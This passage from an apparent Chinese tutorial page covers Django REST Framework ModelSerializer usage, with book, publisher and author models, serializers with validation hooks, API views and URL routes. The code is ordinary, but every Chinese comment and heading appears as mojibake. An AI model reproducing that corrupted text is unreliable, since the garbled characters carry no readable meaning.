é™¤ï¼Œæ•°æ®åº“ä¸­æ˜¯0/1</span></span><br><span class="line">    create_time = models.DateTimeField(auto_now_add=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># è®¾ç½® abstract = True æ¥å£°æ˜åŸºè¡¨ï¼Œä½œä¸ºåŸºè¡¨çš„Modelä¸èƒ½åœ¨æ•°æ®åº“ä¸­å½¢æˆå¯¹åº”çš„è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        abstract = <span class="literal">True</span>  <span class="comment"># å£°æ˜è¯¥è¡¨åªæ˜¯ä¸€ä¸ªæŠ½è±¡è¡¨ä¸å‡ºç°åœ¨æ•°æ®åº“ä¸­</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¹¦ç±è¡¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    price = models.DecimalField(max_digits=<span class="number">5</span>, decimal_places=<span class="number">2</span>)</span><br><span class="line">    img = models.ImageField(upload_to=<span class="string">'img'</span>, default=<span class="string">'default.jpg'</span>)</span><br><span class="line">    <span class="comment"># å…³è”å‡ºç‰ˆç¤¾è¡¨</span></span><br><span class="line">    publish = models.ForeignKey(</span><br><span class="line">        to=<span class="string">'Publish'</span>,  <span class="comment"># å…³è”publishè¡¨</span></span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># æ–­å…³è”ï¼ˆæ–­å¼€Bookè¡¨å’ŒPublishè¡¨çš„å…³è”,æ–¹ä¾¿åˆ æ•°æ®,è™½ç„¶æ–­å¼€äº†å…³è”ä½†æ˜¯è¿˜èƒ½æ­£å¸¸ä½¿ç”¨ï¼‰</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># åå‘æŸ¥è¯¢å­—æ®µï¼špublish_obj.bookså°±èƒ½æŸ¥å‡ºå½“å‰å‡ºç‰ˆç¤¾å‡ºç‰ˆçš„çš„æ‰€æœ‰ä¹¦ç±</span></span><br><span class="line">        on_delete=models.DO_NOTHING,  <span class="comment"># è®¾ç½®è¿è¡¨æ“ä½œå…³ç³»</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># å…³è”ä½œè€…è¡¨</span></span><br><span class="line">    authors = models.ManyToManyField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,  <span class="comment"># æ–­å¼€å…³è”</span></span><br><span class="line">        related_name=<span class="string">'books'</span>,  <span class="comment"># åå‘æŸ¥è¯¢å­—æ®µ</span></span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åºåˆ—åŒ–æ’æ‹”å¼å±æ€§ - å®Œæˆè‡ªå®šä¹‰å­—æ®µåå®Œæˆè¿è¡¨æŸ¥è¯¢</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">publish_name</span><span class="params">(self)</span>:</span>  <span class="comment"># è‡ªå®šä¹‰æŸ¥è¯¢å‡ºç‰ˆç¤¾åå­—</span></span><br><span class="line">        <span class="keyword">return</span> self.publish.name</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">author_list</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.authors.values(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="string">'detail__mobile'</span>).all()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'book'</span></span><br><span class="line">        verbose_name = <span class="string">'ä¹¦ç±'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">        unique_together = (<span class="string">'name'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡ºç‰ˆç¤¾è¡¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Publish</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""nameã€addressã€is_deleteã€create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    address = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'publish'</span></span><br><span class="line">        verbose_name = <span class="string">'å‡ºç‰ˆç¤¾'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½œè€…è¡¨</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Author</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""nameã€ageã€is_deleteã€create_time"""</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.IntegerField()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author'</span></span><br><span class="line">        verbose_name = <span class="string">'ä½œè€…'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.name</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä½œè€…è¯¦æƒ…</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthorDetail</span><span class="params">(BaseModel)</span>:</span></span><br><span class="line">    <span class="string">"""mobile, authorã€is_deleteã€create_time"""</span></span><br><span class="line">    mobile = models.CharField(max_length=<span class="number">11</span>)</span><br><span class="line">    author = models.OneToOneField(</span><br><span class="line">        to=<span class="string">'Author'</span>,</span><br><span class="line">        db_constraint=<span class="literal">False</span>,</span><br><span class="line">        related_name=<span class="string">'detail'</span>,</span><br><span class="line">        on_delete=models.CASCADE</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        db_table = <span class="string">'author_detail'</span></span><br><span class="line">        verbose_name = <span class="string">'ä½œè€…è¯¦æƒ…'</span></span><br><span class="line">        verbose_name_plural = verbose_name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.author.name</span><br></pre></td></tr></table></figure></details><h1 id="serializers-ModelSerializer"><a href="#serializers-ModelSerializer" class="headerlink" title="serializers.ModelSerializer"></a>serializers.ModelSerializer</h1><h2 id="åºåˆ—åŒ–-amp-ååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–-amp-ååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ– &amp; ååºåˆ—åŒ–"></a>åºåˆ—åŒ– &amp; ååºåˆ—åŒ–</h2><h3 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h3><p><code>ModelSerializer</code>æ¨¡å‹ç±»åºåˆ—åŒ–å™¨ä¸å¸¸è§„çš„<code>Serializer</code>ç›¸åŒï¼Œä½†æä¾›äº†ï¼š</p><ol><li>åŸºäºæ¨¡å‹ç±»è‡ªåŠ¨ç”Ÿæˆä¸€ç³»åˆ—å­—æ®µ</li><li>åŒ…å«é»˜è®¤çš„<code>create()</code>å’Œ<code>update()</code>çš„å®ç°</li><li>åŸºäºæ¨¡å‹ç±»è‡ªåŠ¨ä¸º<code>Serializer</code>ç”Ÿæˆ<code>validators</code>ï¼Œæ¯”å¦‚<code>unique_together</code></li></ol><h4 id="åºåˆ—åŒ–å±‚-api-serializers-py"><a href="#åºåˆ—åŒ–å±‚-api-serializers-py" class="headerlink" title="åºåˆ—åŒ–å±‚ api/serializers.py"></a>åºåˆ—åŒ–å±‚ <code>api/serializers.py</code></h4><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.serializers <span class="keyword">import</span> ModelSerializer, SerializerMethodField</span><br><span class="line"><span class="keyword">from</span> rest_framework.exceptions <span class="keyword">import</span> ValidationError</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯ä»¥å•ç‹¬ä½œä¸ºPublishæ¥å£çš„åºåˆ—åŒ–ç±»ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºBookåºåˆ—åŒ–å¤–é”®publishè¾…åŠ©çš„åºåˆ—åŒ–ç»„ä»¶</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PublishModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Publish</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'address'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bookæ¥å£åºåˆ—åŒ–</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># äº†è§£: 1.è¿˜å¯ä»¥è‡ªå®šä¹‰è®¾ç½®åºåˆ—åŒ–å­—æ®µï¼Œä½†æ˜¯å¿…é¡»åœ¨fieldsä¸­å£°æ˜ï¼Œåœ¨fieldsä¸­å†™publish_address</span></span><br><span class="line">    <span class="comment"># publish_address = SerializerMethodField()</span></span><br><span class="line">    <span class="comment"># def get_publish_address(self, obj):</span></span><br><span class="line">    <span class="comment">#     return obj.publish.address</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. è‡ªå®šä¹‰è¿è¡¨æ·±åº¦-å­åºåˆ—åŒ–æ–¹å¼-è¯¥æ–¹å¼ä¸èƒ½å‚ä¸ååºåˆ—åŒ–ï¼Œä½¿ç”¨åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–å…±å­˜æ—¶ï¼Œä¸èƒ½ä¹¦å†™</span></span><br><span class="line">    publish = PublishModelSerializer()</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        <span class="comment"># åºåˆ—åŒ–ç±»å…³è”çš„modelç±»</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        <span class="comment"># å‚ä¸åºåˆ—åŒ–çš„å­—æ®µ</span></span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>, <span class="string">'publish'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># äº†è§£çŸ¥è¯†ç‚¹</span></span><br><span class="line">        <span class="comment"># æ‰€æœ‰å­—æ®µ</span></span><br><span class="line">        <span class="comment"># fields = '__all__'</span></span><br><span class="line">        <span class="comment"># ä¸fieldsä¸å…±å­˜ï¼Œexcludeæ’é™¤å“ªäº›å­—æ®µ</span></span><br><span class="line">        <span class="comment"># exclude = ('id', 'is_delete', 'create_time')</span></span><br><span class="line">        <span class="comment"># è‡ªåŠ¨è¿è¡¨æ·±åº¦</span></span><br><span class="line">        <span class="comment"># depth = 1</span></span><br></pre></td></tr></table></figure></details><h4 id="è§†å›¾å±‚-views-py"><a href="#è§†å›¾å±‚-views-py" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h4><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> rest_framework.views <span class="keyword">import</span> APIView</span><br><span class="line"><span class="keyword">from</span> rest_framework.response <span class="keyword">import</span> Response</span><br><span class="line"><span class="keyword">from</span> . <span class="keyword">import</span> models,serializers</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        pk = kwargs.get(<span class="string">'pk'</span>)</span><br><span class="line">        <span class="comment"># å•æŸ¥</span></span><br><span class="line">        <span class="keyword">if</span> pk:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                book_obj = models.Book.objects.get(pk=pk, is_delete=<span class="literal">False</span>)</span><br><span class="line">                book_data = serializers.BookModelSerializer(</span><br><span class="line">                    book_obj).data  <span class="comment"># å•æ¡æ•°æ®åºåˆ—åŒ–</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">                <span class="keyword">return</span> Response(&#123;</span><br><span class="line">                    <span class="string">'status'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'msg'</span>: <span class="string">'æ•°æ®ä¸å­˜åœ¨'</span></span><br><span class="line">                &#125;)</span><br><span class="line">        <span class="comment"># ç¾¤æŸ¥</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            book_query = models.Book.objects.filter(</span><br><span class="line">                is_delete=<span class="literal">False</span>).all()  <span class="comment"># å…ˆç­›é€‰æŸ¥è¯¢,å†æŸ¥æ‰€æœ‰</span></span><br><span class="line">            book_data = serializers.BookModelSerializer(</span><br><span class="line">                book_query, many=<span class="literal">True</span>).data  <span class="comment"># ä¸ç®¡æ˜¯ä¸€æ¡è¿˜æ˜¯å¤šæ¡ï¼Œåªè¦æ•°æ®æ˜¯è¢«[]åµŒå¥—ï¼Œéƒ½è¦å†™many=True</span></span><br><span class="line">        <span class="comment"># è¿”å›å‰ç«¯æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: book_data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure></details><h4 id="å­è·¯ç”±å±‚-api-urls-py"><a href="#å­è·¯ç”±å±‚-api-urls-py" class="headerlink" title="å­è·¯ç”±å±‚ api/urls.py"></a>å­è·¯ç”±å±‚ <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><h4 id="åºåˆ—åŒ–å±‚-api-serializers-py-1"><a href="#åºåˆ—åŒ–å±‚-api-serializers-py-1" class="headerlink" title="åºåˆ—åŒ–å±‚ api/serializers.py"></a>åºåˆ—åŒ–å±‚ <code>api/serializers.py</code></h4><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BookModelDeserializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># ä¸€äº›åªå‚ä¸ååºåˆ—åŒ–çš„å­—æ®µï¼Œä½†æ˜¯ä¸æ˜¯ä¸æ•°æ®åº“å…³è”çš„ï¼Œè‡ªå®šä¹‰ä¸å…¥åº“çš„ååºåˆ—åŒ–çš„å­—æ®µ</span></span><br><span class="line">    <span class="comment"># è‡ªå®šä¹‰å­—æ®µçš„ read_onlyå±æ€§å¿…é¡»å®šä¹‰åœ¨CharFieldï¼Œä¸èƒ½å†™åœ¨ä¸‹æ–¹çš„extra_kwargsä¸­ï¼Œå¦åˆ™ä¼šè¢«ä¼ å…¥models.Bookè¿›è¡Œååºåˆ—åŒ–è€ŒæŠ¥é”™</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        exclude = [<span class="string">'is_delete'</span>, <span class="string">'create_time'</span>, <span class="string">'img'</span>]</span><br><span class="line">        <span class="comment"># fields = ('name', 'price', 'publish', 'authors','re_name')  #æ²¡æœ‰é»˜è®¤å€¼çš„å­—æ®µå¿…é¡»åºåˆ—åŒ–ï¼Œä¸ºå…¶ä¼ å€¼</span></span><br><span class="line">        <span class="comment"># extra_kwargs ç”¨æ¥å®Œæˆååºåˆ—åŒ–å­—æ®µçš„ ç³»ç»Ÿæ ¡éªŒè§„åˆ™</span></span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,  <span class="comment"># è®¾ç½®nameå­—æ®µå¿…å¡«</span></span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'å¿…å¡«é¡¹'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'å¤ªçŸ­'</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å±€éƒ¨é’©å­æ ¡éªŒå•ä¸ªå­—æ®µ  validate_å­—æ®µå</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_name</span><span class="params">(self, value)</span>:</span>  <span class="comment"># valueæ˜¯å­—æ®µnameçš„å€¼</span></span><br><span class="line">        <span class="comment"># ä¹¦åä¸èƒ½åŒ…å« g å­—ç¬¦</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'g'</span> <span class="keyword">in</span> value.lower():</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'è¯¥gä¹¦ä¸èƒ½å‡ºç‰ˆ'</span>)</span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line">    <span class="comment"># å…¨å±€é’©å­</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate</span><span class="params">(self, attrs)</span>:</span></span><br><span class="line">        publish = attrs.get(<span class="string">'publish'</span>)  <span class="comment"># publishå¦‚æœæ˜¯å¤–é”®å­—æ®µï¼Œè¿™ä¸ªå°±æ˜¯publishå¯¹è±¡</span></span><br><span class="line">        name = attrs.get(<span class="string">'name'</span>)</span><br><span class="line">        <span class="keyword">if</span> models.Book.objects.filter(name=name, publish=publish):</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(&#123;<span class="string">'book'</span>: <span class="string">'è¯¥ä¹¦å·²å­˜åœ¨'</span>&#125;)</span><br><span class="line">        <span class="keyword">return</span> attrs</span><br><span class="line"></span><br><span class="line">    <span class="comment"># æ³¨æ„ï¼šModelSerializerç±»å·²ç»å¸®æˆ‘ä»¬å®ç°äº† create ä¸ update æ–¹æ³•,ä¸éœ€è¦å†™createå°±èƒ½åˆ›å»º</span></span><br></pre></td></tr></table></figure></details><h4 id="è§†å›¾å±‚-views-py-1"><a href="#è§†å›¾å±‚-views-py-1" class="headerlink" title="è§†å›¾å±‚ views.py"></a>è§†å›¾å±‚ <code>views.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Book</span><span class="params">(APIView)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">post</span><span class="params">(self, request, *args, **kwargs)</span>:</span></span><br><span class="line">        request_data = request.data</span><br><span class="line">        book_ser = serializers.BookModelDeserializer(data=request_data)</span><br><span class="line">        <span class="comment"># raise_exception=Trueï¼šå½“æ ¡éªŒå¤±è´¥ï¼Œé©¬ä¸Šç»ˆæ­¢å½“å‰è§†å›¾æ–¹æ³•ï¼ŒæŠ›å¼‚å¸¸è¿”å›ç»™å‰å°</span></span><br><span class="line">        book_ser.is_valid(raise_exception=<span class="literal">True</span>)</span><br><span class="line">        book_obj = book_ser.save()</span><br><span class="line">        <span class="keyword">return</span> Response(&#123;</span><br><span class="line">            <span class="string">'status'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'msg'</span>: <span class="string">'ok'</span>,</span><br><span class="line">            <span class="string">'results'</span>: serializers.BookModelSerializer(book_obj).data</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><h4 id="å­è·¯ç”±å±‚-api-urls-py-1"><a href="#å­è·¯ç”±å±‚-api-urls-py-1" class="headerlink" title="å­è·¯ç”±å±‚ api/urls.py"></a>å­è·¯ç”±å±‚ <code>api/urls.py</code></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'v1/books/'</span>, views.Book.as_view()),</span><br><span class="line">    path(<span class="string">'v1/books/&lt;pk&gt;/'</span>, views.Book.as_view()),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><div class="note warning">            <h4 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h4><ol><li><p>ååºåˆ—åŒ–å±‚ï¼š</p><ul><li>åœ¨è®¾ç½®<code>fields</code>ï¼Œæ²¡æœ‰é»˜è®¤å€¼çš„å­—æ®µéƒ½å¿…é¡»è®¾ç½®ååºåˆ—åŒ–ä¿å­˜åˆ°æ•°æ®åº“ä¸­</li><li>ä½¿ç”¨<code>extra_kwargs</code> æ¥è®¾ç½®ç³»ç»Ÿæ ¡éªŒè§„åˆ™</li><li>è®¾ç½®å±€éƒ¨é’©å­å’Œå…¨å±€é’©å­</li><li><code>ModelSerializer</code>ç±»å·²ç»å¸®æˆ‘ä»¬å®ç°äº† <code>create</code> ä¸ <code>update</code> æ–¹æ³•ï¼Œä¸éœ€è¦å†å†™</li></ul></li><li><p>è§†å›¾å±‚ï¼š</p><ul><li>POSTè¯·æ±‚é€šè¿‡<code>request.data</code>æ‹¿åˆ°æ•°æ®åŒ…</li><li>ä¼ ç»™ååºåˆ—åŒ– ,é€šè¿‡<code>data=request_data</code>ä¼ å…¥éœ€è¦ååºåˆ—åŒ–çš„æ•°æ®</li><li><code>is_valid</code>åˆ¤æ–­æ ¡éªŒæ˜¯å¦åˆæ ¼ ï¼Œ<code>raise_exception=True</code>å¿…é¡»è¦å†™çš„</li><li>é€šè¿‡<code>.save()</code>ä¿å­˜åˆ°æ•°æ®åº“ä¸­</li></ul></li></ol>          </div><h3 id="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ•´åˆ"><a href="#åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ•´åˆ" class="headerlink" title="åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ•´åˆ"></a>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æ•´åˆ</h3><h4 id="åºåˆ—åŒ–å±‚-api-serializers-py-2"><a href="#åºåˆ—åŒ–å±‚-api-serializers-py-2" class="headerlink" title="åºåˆ—åŒ–å±‚ api/serializers.py"></a>åºåˆ—åŒ–å±‚ <code>api/serializers.py</code></h4><details><summary> <b><i>Source Code</i></b> </summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">V2BookModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">    <span class="comment"># ä¸€äº›åªå‚ä¸ååºåˆ—åŒ–çš„å­—æ®µï¼Œä½†æ˜¯ä¸æ˜¯ä¸æ•°æ®åº“å…³è”çš„ï¼Œè‡ªå®šä¹‰ä¸å…¥åº“çš„ååºåˆ—åŒ–çš„å­—æ®µ</span></span><br><span class="line">    re_name = CharField(read_only=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.Book</span><br><span class="line">        fields = (<span class="string">'name'</span>, <span class="string">'price'</span>, <span class="string">'img'</span>, <span class="string">'author_list'</span>,</span><br><span class="line">                  <span class="string">'publish_name'</span>, <span class="string">'publish'</span>, <span class="string">'authors'</span>, <span class="string">'re_name'</span>)</span><br><span class="line">        extra_kwargs = &#123;</span><br><span class="line">            <span class="string">'name'</span>: &#123;</span><br><span class="line">                <span class="string">'required'</span>: <span class="literal">True</span>,</span><br><span class="line">                <span class="string">'min_length'</span>: <span class="number">1</span>,</span><br><span class="line">                <span class="string">'error_messages'</span>: &#123;</span><br><span class="line">                    <span class="string">'required'</span>: <span class="string">'å¿…å¡«é¡¹'</span>,</span><br><span class="line">                    <span class="string">'min_length'</span>: <span class="string">'å¤ªçŸ­'</span>,</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'publish'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">'authors'</span>: &#123;</span><br><span class="line">                <span class="string">'write_only'</span>: <span class="literal">True</span></span><br><span class="line">            